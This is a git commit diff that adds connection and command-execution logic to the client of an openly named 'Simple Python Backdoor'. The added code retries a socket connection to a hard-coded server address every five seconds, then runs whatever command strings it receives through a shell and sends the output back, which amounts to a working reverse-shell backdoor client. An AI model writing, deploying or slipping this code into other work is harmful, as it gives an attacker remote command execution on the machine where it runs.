7d1c2f7fa7b2c02f90edf42912186dcd91f5cc12
Alexsander Lopes Caamrgos <alexcamargos@gmail.com>
2020-12-28 22:05:40 -0300

    Logic for the client to connect to the server.

--- client.py
+++ client.py
@@ -21,6 +21,36 @@ PORT = 33434
 CHUNKS = 2048
 
 
+def simple_python_backdoor_client_connect():
+
+    # Infinite loop until socket can connect
+    while True:
+        try:
+            _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            _socket.connect((IP, PORT))
+            return _socket
+        except socket.error:
+            # Wait 5 seconds to try again.
+            time.sleep(5)
+
+
+def run_command(command):
+
+    command_output = b'\n'
+
+    if len(command) > 0:
+        object_command = subprocess.Popen(command,
+                                          shell=True,
+                                          stdout=subprocess.PIPE,
+                                          stderr=subprocess.PIPE,
+                                          stdin=subprocess.PIPE)
+        command_output += object_command.stdout.read() + object_command.stderr.read()
+    else:
+        command_output += b'Error!'
+
+    return command_output
+
+
 def main():
     _socket = simple_python_backdoor_client_connect()
     _socket.send(b'\n<==========Simple Python Backdoor=========>\n\n')
